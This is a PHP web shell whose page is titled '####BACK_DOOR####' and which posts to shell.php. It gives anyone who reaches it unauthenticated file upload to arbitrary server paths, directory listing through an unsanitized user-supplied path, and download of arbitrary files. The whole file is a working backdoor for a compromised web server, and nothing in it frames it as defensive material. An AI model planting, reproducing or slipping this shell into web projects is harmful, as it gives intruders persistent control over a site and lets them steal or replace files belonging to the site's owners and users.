<?ob_start();?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    <style>
table, th, td {
  border: 1px solid white;
}
</style>
</head>
<body bgcolor = #000>
<?php
    session_start();
    echo "<div style = 'color:white;border:1px white'>";
    echo "<p style = 'font-size:40px;'><i>####BACK_DOOR####</i></p>";
    echo "<hr style ='color:white'>";
    echo "<form action = 'shell.php' method = 'POST' enctype='multipart/form-data'>";
    echo "File Upload: <input type = 'file' name = 'file'><br><br>";
    echo "Destination <input type = 'text' name = 'des' placeholder = '../upload or root'><br><br>";
    echo "<input type = 'submit' name = 'submit' value = 'Upload'>";
    echo "</form><hr style ='color:white'>";
    echo "</div>";
   
    if(isset($_POST["dir_search"])){
        $dir = "../".$_POST["dir_search"];
        $show_dir = $_POST["dir_search"];
    }else{
        $dir = "../";  
        $show_dir ="";
    }

    
    $file_in_dir = scandir($dir,1);
?>
    <form action="shell.php" method = "POST">
    <h2 style ='color:white' >Directory:</h2>
    <div style ='color:white;font-size:20px;'>../&#160;<input type="text" name ="dir_search" value = <?php echo $show_dir; ?>><input type="submit" name ="submit" value ="Go"></div>
    </form><br>
    <table style ='color:white' bordercolor ="#fff" width = 300>
        <thead >
            <tr><th bordercolor ="#fff">List</th><th bordercolor ="#fff">type</th></tr>
            

        </thead>
        <?php 
        foreach($file_in_dir as $val){
            if($val != "." && $val != ".."){
                if(is_dir($dir.$val))
                    echo  "<tr><td><p style ='margin-left:20px'>".$val."</p></td><td>folder</td></tr>";
                else
                    echo  "<tr><td><p style ='margin-left:20px'>".$val."</p></td><td>file</td></tr>";
            }
                
        }
         
        ?>
    </table>
    <hr style ='color:white'>
    <h2 style ='color:white' >Dowload File:</h2>
    <div style ="color:#fff">
    <form action = 'shell.php' method = 'POST'>
        file name:<input type="text" name = "dowload_name" placeholder = "index.html ,connect.php">
        path file:<input type="text" name = "path_dir" placeholder = "../upload/ or root">
        <input type="submit" name ="submit" value ="Download">
    </form>
    </div>
<?php
    if(isset($_FILES["file"]) && isset($_POST["des"])){
        $file_temp = $_FILES["file"]["tmp_name"];
        $file_names = $_FILES["file"]["name"];
        $dest = $_POST["des"];
        if($dest == "root")
            $dest = "../";
        move_uploaded_file($file_temp, $dest.$file_names);
    }
    if(isset($_POST["dowload_name"]) && isset($_POST["path_dir"])){
        $filename = $_POST["dowload_name"]; //Obviously needs validation
        ob_end_clean();
        header("Content-Type: application/octet-stream; "); 
        header("Content-Transfer-Encoding: binary"); 
        header("Content-Length: ". filesize($filename).";"); 
        header("Content-disposition: attachment; filename=" . $filename);
        readfile($_POST["path_dir"].$filename);
        die();
    //echo readfile("test.txt");
    }
    
?> 
</body>
</html>
